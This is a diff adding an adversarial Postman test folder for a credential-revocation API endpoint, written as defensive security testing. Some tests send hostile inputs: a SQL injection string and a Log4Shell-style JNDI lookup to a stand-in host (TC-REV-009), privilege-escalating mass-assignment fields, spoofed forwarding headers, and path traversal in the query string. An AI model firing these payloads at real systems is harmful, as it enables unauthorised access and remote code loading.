@@ -9,6 +9,7 @@
     { "key": "baseUrl", "value": "https://api.credentials.dev.app.hyland.com" },
     { "key": "basePath", "value": "/integration/v1/identity/supervisor/generate" },
     { "key": "challengePath", "value": "/integration/v1/identity/supervisor/entityId/challenge" },
+    { "key": "revokePath", "value": "/integration/v1/identity/supervisor/entityId/revoke" },
     { "key": "validToken", "value": "REPLACE_VALID_TOKEN" },
     { "key": "invalidToken", "value": "abc.def.ghi" },
     { "key": "expiredToken", "value": "REPLACE_EXPIRED_TOKEN" },
@@ -510,6 +511,356 @@
                 "exec": [
                   "pm.test('Missing token is denied', function () {",
                   "  pm.expect([401,403]).to.include(pm.response.code);",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "08 - Revoke Endpoint Adversarial Coverage",
+      "item": [
+        {
+          "name": "TC-REV-001 Revoke Happy/Auth Smoke",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{validToken}}" },
+              { "key": "Content-Type", "value": "application/json" },
+              { "key": "Accept", "value": "application/json" },
+              { "key": "X-Correlation-Id", "value": "{{$guid}}" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{}"
+            },
+            "url": { "raw": "{{baseUrl}}{{revokePath}}" }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Revoke returns expected status family', function () {",
+                  "  pm.expect([200,202,204,404,409]).to.include(pm.response.code);",
+                  "});",
+                  "pm.test('No sensitive fields in response', function () {",
+                  "  const text = pm.response.text().toLowerCase();",
+                  "  ['password','secret','privatekey'].forEach(k => pm.expect(text.includes('\\\"' + k + '\\\"')).to.eql(false));",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
+        },
+        {
+          "name": "TC-REV-002 Missing Token",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" },
+              { "key": "Accept", "value": "application/json" },
+              { "key": "X-Correlation-Id", "value": "{{$guid}}" }
+            ],
+            "body": { "mode": "raw", "raw": "{}" },
+            "url": { "raw": "{{baseUrl}}{{revokePath}}" }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Missing token is denied', function () {",
+                  "  pm.expect([401,403]).to.include(pm.response.code);",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
+        },
+        {
+          "name": "TC-REV-003 Malformed Token",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{invalidToken}}" },
+              { "key": "Content-Type", "value": "application/json" },
+              { "key": "Accept", "value": "application/json" },
+              { "key": "X-Correlation-Id", "value": "{{$guid}}" }
+            ],
+            "body": { "mode": "raw", "raw": "{}" },
+            "url": { "raw": "{{baseUrl}}{{revokePath}}" }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Malformed token is denied', function () {",
+                  "  pm.expect([401,403]).to.include(pm.response.code);",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
+        },
+        {
+          "name": "TC-REV-004 Expired Token",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{expiredToken}}" },
+              { "key": "Content-Type", "value": "application/json" },
+              { "key": "Accept", "value": "application/json" },
+              { "key": "X-Correlation-Id", "value": "{{$guid}}" }
+            ],
+            "body": { "mode": "raw", "raw": "{}" },
+            "url": { "raw": "{{baseUrl}}{{revokePath}}" }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Expired token is denied', function () {",
+                  "  pm.expect([401,403]).to.include(pm.response.code);",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
+        },
+        {
+          "name": "TC-REV-005 Wrong Scope",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{wrongScopeToken}}" },
+              { "key": "Content-Type", "value": "application/json" },
+              { "key": "Accept", "value": "application/json" },
+              { "key": "X-Correlation-Id", "value": "{{$guid}}" }
+            ],
+            "body": { "mode": "raw", "raw": "{}" },
+            "url": { "raw": "{{baseUrl}}{{revokePath}}" }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Wrong scope is denied', function () {",
+                  "  pm.expect([401,403]).to.include(pm.response.code);",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
+        },
+        {
+          "name": "TC-REV-006 Wrong Method GET",
+          "request": {
+            "method": "GET",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{validToken}}" },
+              { "key": "Accept", "value": "application/json" },
+              { "key": "X-Correlation-Id", "value": "{{$guid}}" }
+            ],
+            "url": { "raw": "{{baseUrl}}{{revokePath}}" }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Wrong method is rejected', function () {",
+                  "  pm.expect([400,404,405]).to.include(pm.response.code);",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
+        },
+        {
+          "name": "TC-REV-007 Invalid Content-Type",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{validToken}}" },
+              { "key": "Content-Type", "value": "text/plain" },
+              { "key": "Accept", "value": "application/json" },
+              { "key": "X-Correlation-Id", "value": "{{$guid}}" }
+            ],
+            "body": { "mode": "raw", "raw": "plain-text-body" },
+            "url": { "raw": "{{baseUrl}}{{revokePath}}" }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Invalid content type is rejected', function () {",
+                  "  pm.expect([400,415,422]).to.include(pm.response.code);",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
+        },
+        {
+          "name": "TC-REV-008 Malformed JSON",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{validToken}}" },
+              { "key": "Content-Type", "value": "application/json" },
+              { "key": "Accept", "value": "application/json" },
+              { "key": "X-Correlation-Id", "value": "{{$guid}}" }
+            ],
+            "body": { "mode": "raw", "raw": "{ \"revoke\": true, " },
+            "url": { "raw": "{{baseUrl}}{{revokePath}}" }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Malformed JSON is rejected', function () {",
+                  "  pm.expect([400]).to.include(pm.response.code);",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
+        },
+        {
+          "name": "TC-REV-009 Injection Payload",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{validToken}}" },
+              { "key": "Content-Type", "value": "application/json" },
+              { "key": "Accept", "value": "application/json" },
+              { "key": "X-Correlation-Id", "value": "{{$guid}}" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"entityId\": \"' OR '1'='1\",\n  \"note\": \"${jndi:ldap://example.test/a}\"\n}"
+            },
+            "url": { "raw": "{{baseUrl}}{{revokePath}}" }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Injection attempt is rejected or sanitized', function () {",
+                  "  pm.expect([400,401,403,404,422]).to.include(pm.response.code);",
+                  "});",
+                  "pm.test('No internals leaked', function () {",
+                  "  const t = pm.response.text().toLowerCase();",
+                  "  ['sql','stacktrace','exception at'].forEach(x => pm.expect(t.includes(x)).to.eql(false));",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
+        },
+        {
+          "name": "TC-REV-010 Mass Assignment Attempt",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{validToken}}" },
+              { "key": "Content-Type", "value": "application/json" },
+              { "key": "Accept", "value": "application/json" },
+              { "key": "X-Correlation-Id", "value": "{{$guid}}" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"entityId\": \"{{defaultSupervisorId}}\",\n  \"isAdmin\": true,\n  \"role\": \"superadmin\",\n  \"permissions\": [\"*\"],\n  \"forceGlobalRevoke\": true\n}"
+            },
+            "url": { "raw": "{{baseUrl}}{{revokePath}}" }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Mass assignment does not escalate privilege', function () {",
+                  "  pm.expect([200,202,204,400,403,404,409,422]).to.include(pm.response.code);",
+                  "});",
+                  "pm.test('Dangerous privilege fields are not reflected', function () {",
+                  "  const txt = pm.response.text().toLowerCase();",
+                  "  pm.expect(txt.includes('\\\"superadmin\\\"')).to.eql(false);",
+                  "  pm.expect(txt.includes('\\\"permissions\\\"')).to.eql(false);",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
+        },
+        {
+          "name": "TC-REV-011 Header Spoofing Attempt",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{validToken}}" },
+              { "key": "Content-Type", "value": "application/json" },
+              { "key": "Accept", "value": "application/json" },
+              { "key": "X-Correlation-Id", "value": "{{$guid}}" },
+              { "key": "X-Forwarded-For", "value": "127.0.0.1, 10.0.0.1" },
+              { "key": "X-Original-URL", "value": "/admin/revoke-all" }
+            ],
+            "body": { "mode": "raw", "raw": "{}" },
+            "url": { "raw": "{{baseUrl}}{{revokePath}}" }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Spoofed headers do not bypass controls', function () {",
+                  "  pm.expect([200,202,204,400,401,403,404,409]).to.include(pm.response.code);",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ]
+        },
+        {
+          "name": "TC-REV-012 Query/Path Tampering",
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Authorization", "value": "Bearer {{validToken}}" },
+              { "key": "Content-Type", "value": "application/json" },
+              { "key": "Accept", "value": "application/json" },
+              { "key": "X-Correlation-Id", "value": "{{$guid}}" }
+            ],
+            "body": { "mode": "raw", "raw": "{}" },
+            "url": { "raw": "{{baseUrl}}{{revokePath}}?entityId=..%2f..%2fadmin&force=true" }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Tampered query/path is safely handled', function () {",
+                  "  pm.expect([200,202,204,400,403,404,409,422]).to.include(pm.response.code);",
                   "});"
                 ],
                 "type": "text/javascript"
